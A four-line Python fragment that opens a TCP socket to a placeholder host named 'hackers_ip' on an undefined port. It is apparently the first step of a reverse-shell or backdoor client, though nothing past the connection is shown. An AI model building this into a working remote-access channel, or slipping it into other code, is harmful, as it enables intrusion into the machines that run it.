import socket 

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("hackers_ip", open_port))